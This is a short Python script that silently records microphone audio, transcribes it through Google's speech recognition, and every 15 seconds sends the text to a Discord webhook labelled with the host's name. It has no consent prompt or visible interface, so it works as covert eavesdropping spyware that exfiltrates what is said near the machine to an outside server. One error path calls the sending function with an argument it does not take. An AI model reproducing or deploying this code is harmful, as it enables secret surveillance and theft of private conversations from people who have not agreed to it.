import speech_recognition as sr
import requests
import threading
import time
import socket

WEBHOOK_URL = 'YOUR DISCORD WEBHOOK'
SEND_INTERVAL = 15

hostname = socket.gethostname()

recognizer = sr.Recognizer()
text_buffer = []
stop_listening = None

def send_to_discord():
    while True:
        time.sleep(SEND_INTERVAL)
        if text_buffer:
            message = "\n".join(text_buffer)
            payload = {
                "content": message,
                "username": "Running on "+hostname
            }
            try:
                response = requests.post(WEBHOOK_URL, json=payload)
                response.raise_for_status()
                text_buffer.clear()
            except requests.exceptions.RequestException as e:
                pass

def listen():
    with sr.Microphone() as source:
        recognizer.adjust_for_ambient_noise(source)
        while True:
            try:
                audio = recognizer.listen(source)
                text = recognizer.recognize_google(audio)
                text_buffer.append(text)

            except sr.UnknownValueError:
                pass
            except sr.RequestError as e:
                error_message = f"Could not request results from Google Web Speech API; {e}"
                send_to_discord(error_message)

thread = threading.Thread(target=send_to_discord, daemon=True)
thread.start()

listen_thread = threading.Thread(target=listen, daemon=True)
listen_thread.start()

try:
    while True:
        time.sleep(0.1)
except KeyboardInterrupt:
    pass
